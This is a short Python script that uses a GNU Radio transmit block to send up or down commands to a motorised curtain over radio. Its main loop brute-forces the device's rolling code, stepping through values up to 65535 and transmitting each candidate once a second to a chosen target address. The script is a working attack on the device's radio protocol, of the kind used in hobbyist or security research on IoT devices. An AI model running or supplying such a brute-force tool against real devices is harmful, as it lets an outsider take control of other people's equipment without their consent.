import numpy as np
import matplotlib.pyplot as plt
import os
import sys
import argparse
from encoding import encode
import top_block_transmit
import threading
from time import sleep


def start_grc(tb):
    tb.start()
    tb.wait()

#Takes a list and converts it to 
def msg_builder(args):
    return ''.join([args['key'], args['control'], "0", args['roll_code'], args['address']])

#Returns the next code sequence to try given the last tried rolling code and the step size
def next_rcode(code, step):
    dec_code = int(code, 16)
    dec_code += int(step)

    return hex(dec_code)[2:].zfill(4)

# Construct the argument parser
ap = argparse.ArgumentParser()
# Add the arguments to the parser
ap.add_argument("-a", "--address", required=False,
   help="Specified address of the target in hex decimal")
ap.add_argument("-c", "--control", required=True,
   help="Control command to send to the curtain in hex decimal. up = 2, down = 4")
ap.add_argument("-s", "--roll_code", required=False,
   help="Start value for rolling code in hex decimal. 3 bytes. ex. FFFFFF")
ap.add_argument("-i", "--roll_step", required=False,
   help="step size for the rolling code")
args = vars(ap.parse_args())

args['key'] = 'A0'
ctrl = args['control']
addr = args['address']

if args['roll_code'] == None:
    args['roll_code'] = '0000'
if args['roll_step'] == None:
    args['roll_step'] = 1

#Radio magic
tb = top_block_transmit.top_block()
grc_th = threading.Thread(target=start_grc, args=(tb,))
grc_th.start()

#bin_msg = encode([" ", "-h", "A0200403B2A85C"])
#tb.set_msg(bin_msg)
#
#
#bin_msg = encode([" ", "-h", "A0200400B2A85C"])
#tb.set_msg(bin_msg)


if addr == None:
    #Find address
    pass
else:
    hex_msg = msg_builder(args)
    send_msg = encode([" ", "-h", hex_msg])
    tb.set_msg(send_msg)
    sleep(1)
    print(hex_msg)
    x = 0
    while True:
        if x > 65535:
            break
        args['roll_code'] = next_rcode(args['roll_code'], args['roll_step'])
        hex_msg = msg_builder(args) 
        print(hex_msg)
        send_msg = encode([" ", "-h", hex_msg])
        tb.set_msg(send_msg)
        sleep(1)
        x = int(args['roll_code'],16)